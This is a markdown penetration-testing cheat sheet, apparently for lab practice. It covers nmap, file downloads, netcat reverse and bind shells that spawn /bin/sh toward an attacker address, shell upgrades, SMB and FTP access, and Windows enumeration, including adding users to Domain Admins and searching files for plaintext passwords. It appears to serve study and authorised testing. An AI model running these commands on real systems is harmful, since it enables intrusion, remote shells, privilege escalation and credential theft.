# NMAP
~~~
nmap -T4 -p- -A <target ip>
nmap -T4 -p- -sV <target ip>
~~~
# Python Webserver
~~~
python3 -m http.server <port>
~~~
# Download Files (from you web server)
~~~
**Windows**
certutil.exe -urlcache -f http(s)://<link to file>:<port> <name file>

**Linux**
wget http(s)://<link to file>
curl http(s)://<link to file>
~~~

# Netcat
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
~~~
## Reverse Shell
### Attacker Listener
nc -nlvp 4444

### Target Connecting
nc 192.168.1.2 4444 -e /bin/sh

## Bind Shell
### Attacker Connecting
nc 192.168.1.2 4444

### Target Listener
nc -nvlp 4444 -e /bin/sh
~~~

# TTY Shell
~~~
## Using python
python -c 'import pty; pty.spawn("/bin/sh")'
python -c 'import pty; pty.spawn("/bin/bash")'

## Echo
echo 'os.system('/bin/bash')'

## sh
/bin/sh -i

## bash
/bin/bash -i

## Perl
perl -e 'exec "/bin/sh";'

## From within VI
:!bash
~~~
# System Info
~~~
uname -a
~~~
# Privilege Escalation Check
~~~
sudo -l
~~~
# OpenVPN
~~~
sudo openvpn <file>.vpn
~~~
# ffuf
~~~
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://<ip>/FUZZ
~~~
# SSH
~~~
#Specify specific file to authenticate
ssh -i <privatekeyfile> <username>@<ipaddress>
ssh -i id_rsa john@10.10.6.100
~~~
# Net use/user/group/share/..
~~~
# change password
net use <username> <new password>
net use <username> <new password> /domain

# Check all users that we can find
net user

# connect user
net use \<fqdn | ip address>\ipc$ /user:<username>
net use \<fqdn | ip address>\ipc$ /user:<domain>\<username>

# add user to local group
net localgroup <groupname> <username> /add

# add user to a domain group
net group "Domain Admins" <username> /add /domain

# add user to a domain
net user <new username> /add /domain


~~~
# smbmap
~~~
smbmap -H <targetip> -u 'anonymous'
smbmap -H <targetip> -u 'guest'
~~~
# SMB
![afbeelding](https://github.com/user-attachments/assets/f0f99542-4082-4e29-8b88-f752714038f5)
https://www.computerhope.com/unix/smbclien.htm 
~~~
* You can make use of // or \\\\...\\
* Don't forget sudo if you want to download to your own folder
## List SMB shares
smbclient -L \\\\<target ip>\\

## Connect to SMB share
smbclient \\\\<target ip>\\<share>
smbclient \\\\<target ip>\\<share> -U <user>
smbclient \\\\<target ip>\\<share> -U <user>%<password>
smbclient \\\\<target ip>\\<share> -U <user> -p <port>

smbclient "//<target ip>/<share with space in name>" -U "<domain>\\<username>"
smbclient "\\\\<target ip>\\<share with space in name>" -U "<domain>\\<username>"

## Commands
cd
dir
put
more
get <remote-file> <local-file name>
exit
~~~
# FTP
~~~
Command/Option | Description
ftp ftp.example.com	 |Connect to an FTP server
open ftp.example.com	| Connect to an FTP server
user username password	| Log in with username and password
ls	| List files in the current directory
cd /path/to/dir	| Change remote directory
get file.txt	| Download a file from the server
put file.txt	| Upload a file to the server
mget *.txt	| Download multiple files
mput *.txt	| Upload multiple files
delete file.txt	| Delete a file on the server
mkdir newdir	| Create a new directory on the server
rmdir olddir	| Remove a directory on the server
bye	| Close the connection and exit
~~~

# Windows (System-User-Network-Services) Manual Enumeration
~~~
# got to shell
shell

# hostname
hostname

# user id - privileges - groups
getuid

whoami
whoami /priv
whoami /groups

net user
net user <username> # information about user
net localgroup
net localgroup <group> # example: net localgroup administrators

# system info
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS version" /C:"System Type"

# checking updates
wmic qfe
wmic gfe Caption,Description,HotFixID,InstalledOn

# Disk Info
wmic logicaldisk
wmic logicaldisk get caption,description,providername

# Network
ipconfig /all
arp -a
route print
netstat -ano

# AV Enumeration
sc query windefend
sc queryex type= service

# Firewall
netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config

# find password in plain text files
findstr /si password *.txt *.ini *.config
~~~


